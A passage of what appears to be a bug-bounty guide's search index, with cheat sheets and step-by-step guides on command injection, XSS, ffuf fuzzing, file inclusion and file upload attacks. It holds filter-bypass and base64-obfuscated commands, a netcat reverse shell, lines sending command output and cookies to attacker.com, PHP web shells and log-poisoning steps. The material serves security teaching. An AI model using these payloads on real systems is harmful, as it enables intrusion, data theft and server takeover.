(Linux-only)"},{"location":"bug-bounty-guide/cmd-injection-cheat/#linux","title":"Linux","text":""},{"location":"bug-bounty-guide/cmd-injection-cheat/#filtered-character-bypass","title":"Filtered Character Bypass","text":"Code Description <code>printenv</code> Can be used to view all environment variables Spaces <code>%09</code> Using tabs instead of spaces <code>${IFS}</code> Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. $()) <code>{ls,-la}</code> Commas will be replaced with spaces Other Characters <code>${PATH:0:1}</code> Will be replaced with / <code>${LS_COLORS:10:1}</code> Will be replaced with ; <code>$(tr '!-}' '\"-~'&lt;&lt;&lt;[)</code> Shift character by one ([ -&gt; )"},{"location":"bug-bounty-guide/cmd-injection-cheat/#blacklisted-command-bypass","title":"Blacklisted Command Bypass","text":"Code Description Character Insertion <code>' or \"</code> Total must be even <code>$@ or \\</code> Linux only Case Manipulation <code>$(tr \"[A-Z]\" \"[a-z]\"&lt;&lt;&lt;\"WhOaMi\")</code> Execute command regardless of cases <code>$(a=\"WhOaMi\";printf %s \"${a,,}\")</code> Another variation of the technique Reversed Commands <code>echo 'whoami' | rev</code> Reverse a string <code>$(rev&lt;&lt;&lt;'imaohw')</code> Execute reversed command Encoded Commands <code>echo -n 'cat /etc/passwd | grep 33' | base64</code> Encode a string with base64 <code>bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)</code> Execute b64 encoded string"},{"location":"bug-bounty-guide/cmd-injection-cheat/#windows","title":"Windows","text":""},{"location":"bug-bounty-guide/cmd-injection-cheat/#filtered-character-bypass_1","title":"Filtered Character Bypass","text":"Code Description <code>Get-ChildItem Env:</code> Can be used to view all environment variables - (PowerShell) Spaces <code>%09</code> Using tabs instead of spaces <code>%PROGRAMFILES:~10,-5%</code> Will be replaced with a space - (CMD) <code>$env:PROGRAMFILES[10]</code> Will be replaced with a space - (PowerShell) Other Characters <code>%HOMEPATH:~0,-17%</code> Will be replaced with \\ - (CMD) <code>$env:HOMEPATH[0]</code> Will be replaced with \\ - (PowerShell)"},{"location":"bug-bounty-guide/cmd-injection-cheat/#blacklisted-command-bypass_1","title":"Blacklisted Command Bypass","text":"Code Description Character Insertion <code>' or \"</code> Total must be even <code>^</code> Windows only (CMD) Case Manipulation <code>WhoAmi</code> Simply send the character with odd cases Reversed Commands <code>\"whoami\"[-1..-20] -join ''</code> Reverse a string <code>iex \"$('imaohw'[-1..-20] -join '')\"</code> Execute reversed command Encoded Commands <code>[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))</code> Encode a string with base64 <code>iex \"$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))\"</code> Execute b64 encoded string"},{"location":"bug-bounty-guide/command-injections-guide/","title":"Command Injections","text":"<p>Relative Cheat Sheet</p>"},{"location":"bug-bounty-guide/command-injections-guide/#step-by-step-guide-for-testing-and-exploiting-command-injection-vulnerabilities","title":"Step-by-Step Guide for Testing and Exploiting Command Injection Vulnerabilities","text":""},{"location":"bug-bounty-guide/command-injections-guide/#1-understand-command-injection","title":"1. Understand Command Injection","text":"<ul> <li>Explanation: Command injection allows attackers to execute arbitrary OS commands via unsanitized user input concatenated into shell commands. This can lead to remote code execution (RCE), data exfiltration, or system compromise. It typically occurs in features like ping tools, file downloads, or system utilities where user input is passed to the shell.</li> <li>Why It's Done: Understanding the vulnerability helps identify where commands might be executed, guiding targeted testing. It\u2019s critical to know the OS (Linux/Windows) as commands differ.</li> <li>Example: An app running <code>ping input</code> can be exploited with <code>input &amp; whoami</code> to execute an additional command.</li> </ul>"},{"location":"bug-bounty-guide/command-injections-guide/#2-identify-entry-points","title":"2. Identify Entry Points","text":"<ul> <li>Explanation: Find inputs that may feed into system commands, such as form fields (e.g., ping input), URL parameters, or API endpoints. Use a proxy like Burp Suite to map these inputs.</li> <li>Why It's Done: These are potential injection points; mapping ensures no vulnerable endpoints are missed.</li> <li>Example: A form field for entering an IP address to ping, like <code>ping &lt;user_input&gt;</code>.</li> </ul>"},{"location":"bug-bounty-guide/command-injections-guide/#3-test-with-basic-payloads","title":"3. Test with Basic Payloads","text":"<ul> <li>Explanation: Inject shell metacharacters (<code>;</code>, <code>|</code>, <code>&amp;</code>, <code>||</code>, <code>$()</code>, etc.) followed by simple commands like <code>id</code> or <code>whoami</code>. Observe if the command\u2019s output appears in the response.</li> <li>Why It's Done: Confirms if the application executes user input as part of a shell command, indicating a vulnerability.</li> <li>Example: Input <code>127.0.0.1; id</code> in a ping form to see if <code>uid=1000(user)</code> appears.</li> </ul>"},{"location":"bug-bounty-guide/command-injections-guide/#4-detect-blind-injection","title":"4. Detect Blind Injection","text":"<ul> <li>Explanation: If no output is returned, test for blind injection using time delays (e.g., <code>ping -c 10 127.0.0.1</code>) or out-of-band (OAST) techniques like DNS lookups (<code>nslookup attacker.com</code>).</li> <li>Why It's Done: Blind injections don\u2019t show output but can be confirmed via side effects like delays or external interactions.</li> <li>Example: <code>127.0.0.1 &amp; ping -c 10 127.0.0.1</code> causes a noticeable delay.</li> </ul>"},{"location":"bug-bounty-guide/command-injections-guide/#5-bypass-filters-and-blacklists","title":"5. Bypass Filters and Blacklists","text":"<ul> <li>Explanation: If basic payloads fail, bypass filters using alternative syntax: <code>${IFS}</code> for spaces, case manipulation (<code>WhOaMi</code>), reversed commands (<code>rev&lt;&lt;&lt;imaohw</code>), or encoded payloads (base64).</li> <li>Why It's Done: Applications often filter common characters or commands; creative bypasses exploit weaknesses.</li> <li>Example: Use <code>${IFS}</code> instead of space: <code>cat${IFS}/etc/passwd</code>.</li> </ul>"},{"location":"bug-bounty-guide/command-injections-guide/#6-exfiltrate-data-blindly","title":"6. Exfiltrate Data Blindly","text":"<ul> <li>Explanation: Use OAST to send command output via DNS or HTTP (e.g., <code>nslookup \\</code>whoami`.attacker.com`).</li> <li>Why It's Done: Extracts data when direct output isn\u2019t visible, increasing exploitability.</li> <li>Example: <code>curl http://attacker.com/?data=</code>whoami`` sends the username to your server.</li> </ul>"},{"location":"bug-bounty-guide/command-injections-guide/#7-escalate-to-remote-code-execution","title":"7. Escalate to Remote Code Execution","text":"<ul> <li>Explanation: Inject a reverse shell payload to gain interactive access (e.g., <code>nc -e /bin/sh attacker_ip port</code> on Linux or PowerShell equivalent on Windows).</li> <li>Why It's Done: Turns injection into full system control, maximizing impact.</li> <li>Example: <code>&amp; nc -e /bin/sh 192.168.1.100 9001</code> connects back to your listener.</li> </ul>"},{"location":"bug-bounty-guide/command-injections-guide/#8-test-for-platform-specific-bypasses","title":"8. Test for Platform-Specific Bypasses","text":"<ul> <li>Explanation: Use Linux-specific (<code>$()</code> subshells, <code>${PATH:0:1}</code> for /) or Windows-specific (<code>^</code> for insertion, <code>%HOMEPATH:~0,-17%</code> for ).</li> <li>Why It's Done: Commands and filters vary by OS; testing both ensures comprehensive coverage.</li> <li>Example: Windows: <code>whoami^dir</code> to append dir command.</li> </ul>"},{"location":"bug-bounty-guide/command-injections-guide/#9-use-evasion-tools","title":"9. Use Evasion Tools","text":"<ul> <li>Explanation: Employ tools or scripts to automate obfuscation (e.g., custom base64 encoders or command generators).</li> <li>Why It's Done: Simplifies bypassing complex filters or WAFs.</li> <li>Example: Encode <code>whoami</code> in base64 and decode on target: <code>bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;d2hvYW1p)</code>.</li> </ul>"},{"location":"bug-bounty-guide/command-injections-guide/#10-assess-prevention-measures","title":"10. Assess Prevention Measures","text":"<ul> <li>Explanation: Check if the application sanitizes input, uses safe APIs (e.g., <code>exec()</code> with escaped args), or restricts shell access.</li> <li>Why It's Done: Informs remediation recommendations, like avoiding shell commands or whitelisting inputs.</li> <li>Example: Secure apps use <code>exec(['ping', input])</code> instead of <code>system(\"ping $input\")</code>.</li> </ul> <p>This guide, based on PortSwigger Web Security Academy and the provided cheat sheet, equips hunters to identify and exploit command injection vulnerabilities ethically. Always test within scope and report responsibly.</p>"},{"location":"bug-bounty-guide/cross-site-scripting-guide/","title":"Cross-Site Scripting (XSS)","text":"<p>Relative Cheat Sheet</p>"},{"location":"bug-bounty-guide/cross-site-scripting-guide/#step-by-step-guide-for-testing-and-exploiting-cross-site-scripting-xss-vulnerabilities","title":"Step-by-Step Guide for Testing and Exploiting Cross-Site Scripting (XSS) Vulnerabilities","text":""},{"location":"bug-bounty-guide/cross-site-scripting-guide/#1-understand-xss-and-its-types","title":"1. Understand XSS and Its Types","text":"<ul> <li>Explanation: Cross-site scripting (XSS) is a vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. The injected script runs in the context of the victim's browser, potentially stealing sensitive data, defacing websites, or performing actions on behalf of the user. There are three main types: reflected XSS (script from current request reflected in response), stored XSS (script stored on server and served to users), and DOM-based XSS (script executed via client-side JavaScript modifying the DOM).</li> <li>Why It's Done: Grasping the types helps tailor testing to specific scenarios, such as immediate reflection in search results (reflected) or persistent injection in comments (stored). This step sets the foundation for effective payload crafting and exploitation.</li> <li>Example: In reflected XSS, a search query like <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> might be echoed back in the results page, executing the alert for the user.</li> </ul>"},{"location":"bug-bounty-guide/cross-site-scripting-guide/#2-identify-entry-points-for-user-input","title":"2. Identify Entry Points for User Input","text":"<ul> <li>Explanation: Locate all places where user input is accepted and potentially rendered back, such as URL parameters, form fields, headers, or even cookies. Use browser developer tools or proxies like Burp Suite to map these inputs.</li> <li>Why It's Done: XSS requires an injection point where unsanitized input is outputted. Identifying these ensures comprehensive testing and prevents missing subtle vulnerabilities.</li> <li>Example: A URL like <code>https://example.com/search?q=user_input</code> where <code>q</code> is reflected in the page without escaping.</li> </ul>"},{"location":"bug-bounty-guide/cross-site-scripting-guide/#3-submit-unique-test-input-to-track-reflection","title":"3. Submit Unique Test Input to Track Reflection","text":"<ul> <li>Explanation: Input a unique string (e.g., <code>xss-test-string-123</code>) into each entry point and monitor where it appears in the response using tools like search functions in DevTools or Burp.</li> <li>Why It's Done: This traces how input flows through the application, revealing reflection points for potential injection. It helps distinguish between safe (escaped) and vulnerable (unescaped) outputs.</li> <li>Example: Submit the string in a form; if it appears unescaped in the HTML response, it's a candidate for XSS.</li> </ul>"},{"location":"bug-bounty-guide/cross-site-scripting-guide/#4-analyze-the-context-of-reflection","title":"4. Analyze the Context of Reflection","text":"<ul> <li>Explanation: Determine the context where the input is reflected\u2014HTML body, attribute, JavaScript string, etc.\u2014as this affects the required payload structure.</li> <li>Why It's Done: Different contexts need specific escape sequences or syntax to break out and execute code. For instance, JavaScript contexts require breaking out of strings.</li> <li>Example: If input is in <code>&lt;div&gt;user_input&lt;/div&gt;</code>, it's HTML context; if in <code>var data = \"user_input\";</code>, it's JavaScript context.</li> </ul>"},{"location":"bug-bounty-guide/cross-site-scripting-guide/#5-craft-and-test-proof-of-concept-poc-payloads","title":"5. Craft and Test Proof-of-Concept (PoC) Payloads","text":"<ul> <li>Explanation: Start with simple payloads like <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> for HTML contexts or <code>';alert(1);//</code> for JavaScript. Use <code>print()</code> if <code>alert</code> is blocked in newer browsers.</li> <li>Why It's Done: A PoC confirms execution capability without harm, validating the vulnerability before escalation.</li> <li>Example: For reflected XSS: <code>https://example.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;</code>. If an alert pops, it's vulnerable.</li> </ul>"},{"location":"bug-bounty-guide/cross-site-scripting-guide/#6-differentiate-between-reflected-stored-and-dom-based-xss","title":"6. Differentiate Between Reflected, Stored, and DOM-Based XSS","text":"<ul> <li>Explanation: For reflected, check if payload executes only on submission; for stored, reload the page or visit affected areas; for DOM-based, inspect client-side JS for unsafe sinks like <code>innerHTML</code>.</li> <li>Why It's Done: Each type has different persistence and impact\u2014stored affects multiple users, DOM-based is client-side only.</li> <li>Example: Stored XSS in a comment: Submit payload, view comment section to see execution.</li> </ul>"},{"location":"bug-bounty-guide/cross-site-scripting-guide/#7-test-for-filter-bypasses","title":"7. Test for Filter Bypasses","text":"<ul> <li>Explanation: If basic payloads fail, vary case (<code>&lt;ScRiPt&gt;</code>), use alternative tags (<code>&lt;img src=x onerror=alert(1)&gt;</code>), or encode (<code>&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;</code>).</li> <li>Why It's Done: Applications often have WAFs or filters blocking common payloads; bypasses uncover hidden vulnerabilities.</li> <li>Example: If <code>&lt;script&gt;</code> is blocked, use <code>&lt;svg onload=alert(1)&gt;</code>.</li> </ul>"},{"location":"bug-bounty-guide/cross-site-scripting-guide/#8-exploit-the-vulnerability-for-impact","title":"8. Exploit the Vulnerability for Impact","text":"<ul> <li>Explanation: Escalate from PoC to real impact, like stealing cookies (<code>document.cookie</code> sent to attacker server) or defacing (<code>document.body.innerHTML = 'Hacked';</code>).</li> <li>Why It's Done: Demonstrates severity for bounty reports, such as session hijacking or phishing.</li> <li>Example: <code>&lt;script&gt;new Image().src='https://attacker.com/?c='+document.cookie;&lt;/script&gt;</code> to exfiltrate cookies.</li> </ul>"},{"location":"bug-bounty-guide/cross-site-scripting-guide/#9-chain-with-other-vulnerabilities","title":"9. Chain with Other Vulnerabilities","text":"<ul> <li>Explanation: Combine XSS with CSRF or session fixation for amplified attacks, e.g., using XSS to forge requests.</li> <li>Why It's Done: Real-world exploits often chain vulns for greater impact, like persistent access.</li> <li>Example: Stored XSS injecting CSRF payload to change user email.</li> </ul>"},{"location":"bug-bounty-guide/cross-site-scripting-guide/#10-assess-prevention-measures","title":"10. Assess Prevention Measures","text":"<ul> <li>Explanation: Verify if the app uses Content Security Policy (CSP), input sanitization, or output encoding to block XSS.</li> <li>Why It's Done: To recommend fixes in reports, like escaping user input or implementing CSP headers.</li> <li>Example: CSP <code>default-src 'self'</code> blocks inline scripts unless nonce used.</li> </ul> <p>This guide, based on PortSwigger Web Security Academy, equips hunters to systematically find and report XSS for bounties. Always test ethically and report responsibly.</p>"},{"location":"bug-bounty-guide/ffuf-cheat/","title":"Attacking Web Applications with Ffuf Cheat Sheet","text":""},{"location":"bug-bounty-guide/ffuf-cheat/#commands","title":"Commands","text":"Command Description <code>ffuf -h</code> Display ffuf help menu <code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ</code> Directory Fuzzing to discover hidden directories <code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ</code> Extension Fuzzing to identify file types <code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php</code> Page Fuzzing to find dynamic pages <code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v</code> Recursive Fuzzing to explore subdirectories with verbose output <code>ffuf -w wordlist.txt:FUZZ -u https://FUZZ.hackthebox.eu/</code> Sub-domain Fuzzing to enumerate subdomains <code>ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx</code> VHost Fuzzing to detect virtual hosts, filtering by size <code>ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx</code> Parameter Fuzzing - GET to find injectable parameters <code>ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx</code> Parameter Fuzzing - POST to test POST-based parameters <code>ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx</code> Value Fuzzing to test parameter value vulnerabilities"},{"location":"bug-bounty-guide/ffuf-cheat/#wordlists","title":"Wordlists","text":"Command Description <code>/opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt</code> Directory/Page Wordlist for fuzzing directories and pages <code>/opt/useful/seclists/Discovery/Web-Content/web-extensions.txt</code> Extensions Wordlist for fuzzing file extensions <code>/opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt</code> Domain Wordlist for subdomain enumeration <code>/opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt</code> Parameters Wordlist for parameter fuzzing"},{"location":"bug-bounty-guide/ffuf-cheat/#misc","title":"Misc","text":"Command Description <code>sudo sh -c 'echo \"SERVER_IP academy.htb\" &gt;&gt; /etc/hosts'</code> Add a DNS entry to resolve custom domains <code>for i in $(seq 1 1000); do echo $i &gt;&gt; ids.txt; done</code> Create a sequence wordlist for value fuzzing <code>curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'</code> Example curl command with POST request"},{"location":"bug-bounty-guide/file-inclusion-cheat/","title":"File Inclusion Cheat Sheet","text":""},{"location":"bug-bounty-guide/file-inclusion-cheat/#local-file-inclusion","title":"Local File Inclusion","text":"Command Description Basic LFI <code>/index.php?language=/etc/passwd</code> Basic LFI <code>/index.php?language=../../../../etc/passwd</code> LFI with path traversal <code>/index.php?language=/../../../etc/passwd</code> LFI with name prefix <code>/index.php?language=./languages/../../../../etc/passwd</code> LFI with approved path LFI Bypasses <code>/index.php?language=....//....//....//....//etc/passwd</code> Bypass basic path traversal filter <code>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64</code> Bypass filters with URL encoding <code>/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]</code> Bypass appended extension with path truncation (obsolete) <code>/index.php?language=../../../../etc/passwd%00</code> Bypass appended extension with null byte (obsolete) <code>/index.php?language=php://filter/read=convert.base64-encode/resource=config</code> Read PHP with base64 filter"},{"location":"bug-bounty-guide/file-inclusion-cheat/#remote-code-execution","title":"Remote Code Execution","text":"Command Description PHP Wrappers <code>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id</code> RCE with data wrapper <code>curl -s -X POST --data '&lt;?php system($_GET[\"cmd\"]); ?&gt;' \"http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://input&amp;cmd=id\"</code> RCE with input wrapper <code>curl -s \"http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=expect://id\"</code> RCE with expect wrapper RFI <code>echo '&lt;?php system($_GET[\"cmd\"]); ?&gt;' &gt; shell.php &amp;&amp; python3 -m http.server &lt;LISTENING_PORT&gt;</code> Host web shell <code>/index.php?language=http://&lt;OUR_IP&gt;:&lt;LISTENING_PORT&gt;/shell.php&amp;cmd=id</code> Include remote PHP web shell LFI + Upload <code>echo 'GIF8&lt;?php system($_GET[\"cmd\"]); ?&gt;' &gt; shell.gif</code> Create malicious image <code>/index.php?language=./profile_images/shell.gif&amp;cmd=id</code> RCE with malicious uploaded image <code>echo '&lt;?php system($_GET[\"cmd\"]); ?&gt;' &gt; shell.php &amp;&amp; zip shell.jpg shell.php</code> Create malicious zip archive 'as jpg' <code>/index.php?language=zip://shell.zip%23shell.php&amp;cmd=id</code> RCE with malicious uploaded zip <code>php --define phar.readonly=0 shell.php &amp;&amp; mv shell.phar shell.jpg</code> Create malicious phar 'as jpg' <code>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&amp;cmd=id</code> RCE with malicious uploaded phar Log Poisoning <code>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd</code> Read PHP session parameters <code>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E</code> Poison PHP session with web shell <code>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&amp;cmd=id</code> RCE through poisoned PHP session <code>curl -s \"http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php\" -A '&lt;?php system($_GET[\"cmd\"]); ?&gt;'</code> Poison server log <code>/index.php?language=/var/log/apache2/access.log&amp;cmd=id</code> RCE through poisoned PHP session"},{"location":"bug-bounty-guide/file-inclusion-cheat/#misc","title":"Misc","text":"Command Description <code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?FUZZ=value' -fs 2287</code> Fuzz page parameters <code>ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=FUZZ' -fs 2287</code> Fuzz LFI payloads <code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ/index.php' -fs 2287</code> Fuzz webroot path <code>ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ' -fs 2287</code> Fuzz server configurations"},{"location":"bug-bounty-guide/file-inclusion-cheat/#lfi-wordlists","title":"LFI Wordlists","text":"<ul> <li>LFI-Jhaddix.txt</li> <li>Webroot path wordlist for Linux</li> <li>Webroot path wordlist for Windows</li> <li>Server configurations wordlist for Linux</li> <li>Server configurations wordlist for Windows</li> </ul>"},{"location":"bug-bounty-guide/file-inclusion-cheat/#file-inclusion-functions","title":"File Inclusion Functions","text":"Function Read Content Execute Remote URL PHP <code>include()/include_once()</code> Yes Yes Yes <code>require()/require_once()</code> Yes Yes No <code>file_get_contents()</code> Yes No Yes <code>fopen()/file()</code> Yes No No NodeJS <code>fs.readFile()</code> Yes No No <code>fs.sendFile()</code> Yes No No <code>res.render()</code> Yes Yes No Java <code>include</code> Yes No No <code>import</code> Yes Yes Yes .NET <code>@Html.Partial()</code> Yes No No <code>@Html.RemotePartial()</code> Yes No Yes <code>Response.WriteFile()</code> Yes No No <code>include</code> Yes Yes Yes"},{"location":"bug-bounty-guide/file-inclusion-guide/","title":"File Inclusion","text":"<p>Relative Cheat Sheet</p>"},{"location":"bug-bounty-guide/file-inclusion-guide/#step-by-step-guide-for-testing-and-exploiting-file-inclusion-vulnerabilities","title":"Step-by-Step Guide for Testing and Exploiting File Inclusion Vulnerabilities","text":""},{"location":"bug-bounty-guide/file-inclusion-guide/#1-understand-file-inclusion-vulnerabilities","title":"1. Understand File Inclusion Vulnerabilities","text":"<ul> <li>Explanation: File inclusion vulnerabilities occur when applications include files based on user input without validation, leading to Local File Inclusion (LFI, reading local files) or Remote File Inclusion (RFI, executing remote files). LFI can leak sensitive data, while RFI can lead to RCE.</li> <li>Why It's Done: Knowing LFI vs RFI helps tailor payloads for data extraction or code execution.</li> <li>Example: <code>?file=../../etc/passwd</code> reads a system file, or <code>?file=http://attacker.com/shell.php</code> executes remote code.</li> </ul>"},{"location":"bug-bounty-guide/file-inclusion-guide/#2-identify-file-inclusion-parameters","title":"2. Identify File Inclusion Parameters","text":"<ul> <li>Explanation: Look for URL parameters like <code>?file=</code>, <code>?page=</code>, or <code>?template=</code> that control included files, often in CMS or legacy apps.</li> <li>Why It's Done: These are injection points; missing them limits testing scope.</li> <li>Example: <code>http://example.com/index.php?page=about.php</code> where <code>page</code> specifies a file.</li> </ul>"},{"location":"bug-bounty-guide/file-inclusion-guide/#3-test-for-basic-lfi","title":"3. Test for Basic LFI","text":"<ul> <li>Explanation: Inject paths like <code>/etc/passwd</code> or <code>../../etc/passwd</code> to read sensitive files.</li> <li>Why It's Done: Confirms if the application includes local files without validation.</li> <li>Example: <code>page=../../etc/passwd</code> to display system user file.</li> </ul>"},{"location":"bug-bounty-guide/file-inclusion-guide/#4-test-path-traversal-bypasses","title":"4. Test Path Traversal Bypasses","text":"<ul> <li>Explanation: Use encoded (<code>%2e%2e%2f</code>), nested (<code>....//</code>), or absolute paths (<code>/etc/passwd</code>) to bypass filters stripping <code>../</code>.</li> <li>Why It's Done: Many apps filter basic traversal; advanced techniques evade these.</li> <li>Example: <code>page=....//....//etc/passwd</code> to bypass dot-dot-slash filters.</li> </ul>"},{"location":"bug-bounty-guide/file-inclusion-guide/#5-test-for-rfi","title":"5. Test for RFI","text":"<ul> <li>Explanation: Inject a remote URL (e.g., <code>http://attacker.com/shell.php</code>) if <code>allow_url_include</code> is enabled.</li> <li>Why It's Done: Allows direct code execution from a malicious server.</li> <li>Example: Host <code>shell.php</code> with <code>&lt;?php system($_GET['cmd']); ?&gt;</code> and set <code>page=http://attacker.com/shell.php</code>.</li> </ul>"},{"location":"bug-bounty-guide/file-inclusion-guide/#6-use-php-wrappers-for-advanced-lfi","title":"6. Use PHP Wrappers for Advanced LFI","text":"<ul> <li>Explanation: Use wrappers like <code>php://filter/convert.base64-encode/resource=config.php</code> to read source code or <code>data://</code> for code execution.</li> <li>Why It's Done: Bypasses restrictions on file access or enables RCE.</li> <li>Example: <code>page=php://filter/convert.base64-encode/resource=index.php</code> to read PHP source.</li> </ul>"},{"location":"bug-bounty-guide/file-inclusion-guide/#7-chain-with-file-upload-or-log-poisoning","title":"7. Chain with File Upload or Log Poisoning","text":"<ul> <li>Explanation: Upload a malicious file (e.g., <code>shell.gif</code> with PHP code) and include it via LFI, or inject code into logs (e.g., user-agent) and include the log file.</li> <li>Why It's Done: Turns LFI into RCE when direct RFI isn\u2019t possible.</li> <li>Example: Set user-agent to <code>&lt;?php system($_GET['cmd']); ?&gt;</code>, include <code>page=/var/log/apache2/access.log</code>.</li> </ul>"},{"location":"bug-bounty-guide/file-inclusion-guide/#8-fuzz-for-files-and-paths","title":"8. Fuzz for Files and Paths","text":"<ul> <li>Explanation: Use ffuf with LFI wordlists (e.g., <code>/opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt</code>) to find readable files or configs.</li> <li>Why It's Done: Automates discovery of sensitive files or directories.</li> <li>Example: <code>ffuf -w LFI-Jhaddix.txt:FUZZ -u http://example.com/?page=FUZZ</code>.</li> </ul>"},{"location":"bug-bounty-guide/file-inclusion-guide/#9-escalate-to-rce","title":"9. Escalate to RCE","text":"<ul> <li>Explanation: Execute commands via included shells or wrappers (e.g., <code>data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+</code>).</li> <li>Why It's Done: Maximizes impact from file read to full system access.</li> <li>Example: <code>page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+&amp;cmd=id</code>.</li> </ul>"},{"location":"bug-bounty-guide/file-inclusion-guide/#10-assess-prevention-measures","title":"10. Assess Prevention Measures","text":"<ul> <li>Explanation: Check for absolute paths, whitelists, or disabled <code>allow_url_include</code>.</li> <li>Why It's Done: Informs remediation, like restricting file paths or disabling dangerous PHP settings.</li> <li>Example: Secure app uses <code>include 'pages/' . basename($file)</code> to limit inclusions.</li> </ul> <p>This guide, based on PortSwigger Web Security Academy and the provided cheat sheet, provides a thorough process for testing file inclusion vulnerabilities. Test ethically within scope.</p>"},{"location":"bug-bounty-guide/file-upload-attacks-guide/","title":"File Upload Attacks","text":"<p>Relative Cheat Sheet</p>"},{"location":"bug-bounty-guide/file-upload-attacks-guide/#step-by-step-guide-for-testing-and-exploiting-file-upload-vulnerabilities","title":"Step-by-Step Guide for Testing and Exploiting File Upload Vulnerabilities","text":""},{"location":"bug-bounty-guide/file-upload-attacks-guide/#1-understand-file-upload-vulnerabilities","title":"1. Understand File Upload Vulnerabilities","text":"<ul> <li>Explanation: File upload vulnerabilities occur when applications allow uploading files without proper validation of type, content, or size, potentially leading to remote code execution (RCE) via malicious scripts, client-side attacks like XSS, or denial-of-service (DoS) via resource exhaustion.</li> <li>Why It's Done: Understanding the risks (e.g., executing a PHP shell or injecting XSS) helps prioritize testing for high-impact vulnerabilities.</li> <li>Example: Uploading <code>shell.php</code> with <code>&lt;?php system($_GET['cmd']); ?&gt;</code> that executes commands when accessed.</li> </ul>"},{"location":"bug-bounty-guide/file-upload-attacks-guide/#2-identify-upload-features","title":"2. Identify Upload Features","text":"<ul> <li>Explanation: Locate forms or API endpoints with <code>&lt;input type=\"file\"&gt;</code> or file upload functionality, such as profile picture uploads or document submissions.</li> <li>Why It's Done: These are the entry points for testing; missing them could overlook critical vulnerabilities.</li> <li>Example: A user profile page with an avatar upload form.</li> </ul>"},{"location":"bug-bounty-guide/file-upload-attacks-guide/#3-test-unrestricted-uploads","title":"3. Test Unrestricted Uploads","text":"<ul> <li>Explanation: Attempt to upload a malicious file, like a PHP web shell (<code>&lt;?php system($_REQUEST['cmd']); ?&gt;</code>), and access it to see if it executes.</li> <li>Why It's Done: Lack of validation allows immediate RCE, the highest-impact exploit.</li> <li>Example: Upload <code>shell.php</code> and access <code>/uploads/shell.php?cmd=id</code> to see if <code>id</code> command runs.</li> </ul>"},{"location":"bug-bounty-guide/file-upload-attacks-guide/#4-analyze-server-file-handling","title":"4. Analyze Server File Handling","text":"<ul> <li>Explanation: Determine how the server processes uploaded files\u2014check if it relies on extensions, MIME types, or content inspection, and whether files are executable.</li> <li>Why It's Done: Understanding handling (e.g., PHP files executed vs. served as text) informs bypass strategies.</li> <li>Example: Upload <code>test.php</code> and see if it\u2019s executed or downloaded as plain text.</li> </ul>"},{"location":"bug-bounty-guide/file-upload-attacks-guide/#5-bypass-client-side-validation","title":"5. Bypass Client-Side Validation","text":"<ul> <li>Explanation: Use a proxy (Burp Suite) or disable JavaScript (DevTools, CTRL+SHIFT+C) to bypass client-side checks on file types or sizes.</li> <li>Why It's Done: Client-side validation is easily bypassed, exposing server-side weaknesses.</li> <li>Example: Change <code>image/jpeg</code> to <code>application/x-php</code> in intercepted request.</li> 